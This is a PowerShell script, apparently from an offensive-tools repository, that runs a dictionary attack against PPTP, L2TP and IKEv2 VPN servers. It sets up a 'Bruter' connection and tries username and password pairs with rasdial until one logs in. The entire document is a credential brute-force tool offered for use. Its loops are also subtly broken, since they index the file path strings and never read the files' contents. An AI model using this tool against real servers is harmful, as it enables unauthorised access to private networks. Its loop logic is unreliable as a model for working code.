function Invoke-VpnBruteForce{
<#
    .SYNOPSIS
    This Will Help You to launch an Dictionary attack to PPtP L2tp & Ikev2 Vpn.

    Author: Prince%00
        
    .PARAMETER Checkvpn
    Checking Vpn The Connections Made by you before attack 

    .PARAMETER UsernameFilePath
    The username file path.

    .PARAMETER PasswordFilePath
    The Password file path.

    .PARAMETER VPNType
    Your VPN connection type.

    .PARAMETER TunType
    Kind of tunnel encryption.

    .PARAMETER ServerAddress
    Your target server for Dictionary attack.

    .EXAMPLE
     Invoke-VpnBruteForce -ServerAddress 192.168.20.10 -UsernameFilePath C:\Usernames.txt -PasswordFilePath C:\Passwords.txt -TunType Pptp 

    .LINK
     https://github.com/Prince-Amir/Offensive-Powershell.git
#>
    [CmdletBinding()]param (
#        [Parameter(Position = 0, Mandatory=$true,
#                   HelpMessage='Check VPN Connection')       
#        ]
#        [bool]
#        $Checkvpn,

        [Parameter(Position = 1, Mandatory=$true)]
        [string]
        $ServerAddress,

        [Parameter(Position = 1, Mandatory=$true)]
        [string]
        $UsernameFilePath,

        [Parameter(Position = 2, Mandatory=$true)]
        [string]
        $PasswordFilePath,

        
       
        [Parameter(ParameterSetName = 'TunType', Mandatory=$true)]
        [Validateset('Pptp','L2tp','Ikev2','Automatic')]
        [Alias('tt')]
        [string]
        $TunType

        
        )


BEGIN{}

PROCESS{
$Checkvpn = Get-VpnConnection
        
        if ($Checkvpn.ConnectionStatus -cmatch 'Connected'){

        echo '!!Your Connected By Your Bruter Connection First Disconnect!!'
        return}


        elseif ($Checkvpn.Name -match 'Bruter'){

            Set-VpnConnection -Name Bruter -ServerAddress $ServerAddress -TunnelType $TunType
            #'!!!Your Vpn Has Built Before Its Named Bruter You Can Change Your Config In [ControlPanel\Network and Internet\Network Connections]!!!'
        }
        else{

            Add-VpnConnection -name Bruter -ServerAddress $ServerAddress -TunnelType $TunType               
           
        }

    
    for ($x=0;$x -le $UsernameFilePath.count; $x++){
    
        $listuser =  $UsernameFilePath[$x]
  
            for($y=0;$y -le $PasswordFilePath.count; $y++){
                
                    $listpass = $PasswordFilePath[$y]
             
            
                    [string]$Connection =  rasdial "Bruter" $listuser $listpass
                                                                 
                        if ($Connection -match 'error'  )
            
                            {Write-Host "[-]$listuser : $listpass" -ForegroundColor red -BackgroundColor Black}
             
                        else
            
                            {echo '  YES !!!!!Your Username & Password Found!!!!!  '
                            echo [+]username: $UsernameFilePath[$x]
                            echo [+]password: $PasswordFilePath[$y]
                            exit}

            }

     }
   }   
}
